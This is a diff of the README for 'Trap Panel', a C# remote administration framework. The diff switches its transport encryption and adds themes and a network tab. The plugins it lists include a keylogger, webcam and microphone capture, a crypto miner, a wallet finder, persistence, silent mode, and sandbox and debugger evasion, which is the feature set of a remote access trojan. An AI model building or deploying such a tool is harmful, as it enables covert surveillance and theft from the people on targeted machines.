@@ -1,8 +1,8 @@
 # Trap Panel
 
-**Modular remote administration framework with TLS 1.3 encrypted TCP, 18 plugins, and C#/PowerShell agent deployment.**
+**Modular remote administration framework with AES-256-CBC + HMAC encrypted TCP, 18 plugins, and C#/PowerShell agent deployment.**
 
-Trap Panel is a remote administration framework coded in C# (.NET 8, WPF) featuring TLS 1.3 encrypted TCP communications, a plugin-based architecture for real-time bidirectional control, and both C# and PowerShell agent deployment. It provides a broad feature set ranging from system administration to security research.
+Trap Panel is a remote administration framework coded in C# (.NET 8, WPF) featuring encrypted TCP communications via AES-256-CBC + HMAC-SHA256, a plugin-based architecture for real-time bidirectional control, and both C# and PowerShell agent deployment. It provides a broad feature set ranging from system administration to security research.
 
 ## Screenshots
 
@@ -10,15 +10,16 @@ Trap Panel is a remote administration framework coded in C# (.NET 8, WPF) featur
 
 ## Features
 
-- **TLS 1.3 encrypted transport** — all traffic secured via SslStream with AES-256-GCM payload encryption
+- **AES-256-CBC + HMAC encrypted transport** — encrypt-then-MAC protocol with per-message random IV
 - **18 built-in plugins** — shell, file manager, registry, screen monitor, keystroke monitor, webcam, microphone, remote desktop, SOCKS5 proxy, crypto miner, wallet finder, process guard, persistence, system info, process monitor, API hooks, countdown, auto-update
 - **C# + PowerShell agent generation** — Roslyn-compiled .NET executable or lightweight PowerShell script
 - **Plugin-based architecture** — modular IServerPlugin interface with per-client session routing
 - **Real-time push model** — event-driven command delivery within milliseconds of queuing
 - **Auto Tasks engine** — schedule automated plugin execution on client connect
-- **8 customizable themes** — Dark, Light, Midnight, Hacker, Nord, Dracula, Solarized, Tokyo Night
+- **11 customizable themes** — Dark, Light, Midnight, Hacker, Nord, Dracula, Solarized, Tokyo Night, Monokai, One Dark, Catppuccino
 - **Rate limiting & environment checks** — connection throttling, debugger and sandbox detection
 - **Certificate-based server identity** — auto-generated RSA 4096-bit self-signed certificate
+- **Network info tab** — view public IP, hostname, local IPs, subnet, gateway, DNS, and active adapter details
 
 ## Built-in Plugins
 
@@ -53,7 +54,7 @@ Configure and generate deployment-ready agents from the Builder tab.
 | Server IP / Hostname | Server address |
 | Port | TCP port for client connection |
 | Password | Authentication secret (minimum 12 characters) |
-| Encryption Key | AES-256 key for PBKDF2 (optional — TLS secures transport) |
+| Encryption Key | AES-256 key for PBKDF2 — derives encryption and HMAC keys |
 | Silent Mode | Run agent without console or visible window |
 | Install Name | Filename for the installed agent |
 | Install Directory | Target directory for agent installation |
@@ -71,7 +72,7 @@ Configure and generate deployment-ready agents from the Builder tab.
 | 0 | 4 | Magic — `0xDEADBEEF` (big-endian) |
 | 4 | 4 | Payload length (big-endian, max 100 MB) |
 | 8 | 1 | Message type |
-| 9 | N | Encrypted payload (AES-256-GCM) |
+| 9 | N | Encrypted payload (AES-256-CBC + HMAC-SHA256) |
 
 ### Message Types
 
@@ -95,8 +96,8 @@ Client                                 Server
   │                                        │
   │── TCP Connect ──────────────────────► │
   │                                        │
-  │── Handshake (certificate) ───────────►│
-  │◄── HandshakeResponse (nonce) ──────── │
+  │── Handshake (RSA public key) ────────►│
+  │◄── HandshakeResponse (AES-256 + HMAC keys) ── │
   │                                        │
   │── Auth (JSON: password) ─────────────►│
   │◄── AuthResponse (success/failure) ──── │
@@ -128,13 +129,13 @@ Authentication JSON format:
 ## Building
 
 ```powershell
-git clone https://github.com/your-repo/TrapPanel
-cd TrapPanel
+git clone https://github.com/Trapwithme/Trap-Panel
+cd Trap-Panel
 
-dotnet build
+dotnet build -c Release
 ```
 
-Run the generated executable from `bin\Debug\net8.0-windows7.0\LoaderKeyed.exe`.
+Run the generated executable from `bin\Release\net8.0-windows7.0\LoaderKeyed.exe`.
 
 ## Usage
 
@@ -145,6 +146,7 @@ Run the generated executable from `bin\Debug\net8.0-windows7.0\LoaderKeyed.exe`.
 5. **Generate agent** — click "Generate PS1" or "Compile EXE"
 6. **Deploy** — run the generated agent on the target machine
 7. **Manage** — connected clients appear in the Clients tab; right-click to launch plugins
+8. **Network info** — view public IP, local IPs, gateway, DNS, and adapter details in the Network tab
 
 ## Themes
 
@@ -158,15 +160,18 @@ Run the generated executable from `bin\Debug\net8.0-windows7.0\LoaderKeyed.exe`.
 | Dracula | Dark purple background, pink and green accents |
 | Solarized | Dark brown background, yellow and blue accents |
 | Tokyo Night | Deep blue background, cyan and pink accents |
+| Monokai | Dark violet background, yellow and orange accents |
+| One Dark | Dark gray-blue background, blue and green accents |
+| Catppuccino | Muted brown background, pastel accents |
 
 ## Security
 
 | Measure | Detail |
 |---|---|
-| Transport | TLS 1.3 with RSA 4096-bit server certificate |
-| Payload | AES-256-GCM with random 96-bit nonce and 128-bit tag |
+| Transport | RSA 4096-bit key exchange over raw TCP |
+| Payload | AES-256-CBC with HMAC-SHA256 (encrypt-then-MAC) |
 | Key derivation | PBKDF2 with 100,000 iterations (SHA-256) and 16-byte salt |
-| Authentication | Password validated via constant-time comparison over TLS |
+| Authentication | Password validated via constant-time comparison over encrypted channel |
 | Rate limiting | 100 max concurrent connections, 5 per IP |
 | Auto-ban | 1-hour IP ban after 3 failed auth attempts |
 | Environment checks | Debugger detection, sandbox detection |
